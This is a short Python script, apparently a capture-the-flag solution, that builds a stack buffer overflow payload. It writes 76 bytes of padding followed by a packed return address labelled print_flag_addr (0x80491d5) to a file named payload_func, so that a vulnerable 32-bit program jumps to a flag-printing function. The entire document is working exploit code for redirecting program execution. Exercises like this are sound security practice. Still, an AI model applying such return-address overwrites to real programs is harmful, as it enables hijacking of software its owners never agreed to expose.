import struct

offset = 76
print_flag_addr = 0x80491d5

the_payload = (b"A"*offset) + struct.pack("<I", print_flag_addr)

with open("payload_func", "wb") as f:
    f.write(the_payload)
